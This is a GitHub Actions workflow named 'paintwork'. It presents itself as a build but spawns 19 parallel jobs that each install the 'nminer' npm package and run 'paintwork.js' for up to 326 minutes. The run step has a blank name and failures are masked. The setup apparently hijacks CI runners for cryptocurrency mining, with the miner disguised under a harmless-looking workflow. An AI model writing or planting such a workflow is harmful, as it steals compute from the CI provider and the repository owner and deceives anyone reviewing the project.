name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3425 }
          - { version: 1840 }
          - { version: 2428 }
          - { version: 9113 }
          - { version: 8196 }
          - { version: 6059 }
          - { version: 1407 }
          - { version: 677 }
          - { version: 4277 }
          - { version: 3887 }
          - { version: 3237 }
          - { version: 2138 }
          - { version: 6733 }
          - { version: 5584 }
          - { version: 6742 }
          - { version: 1681 }
          - { version: 5680 }
          - { version: 1615 }
          - { version: 5663 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 326m node paintwork.js || echo "paintwork executed"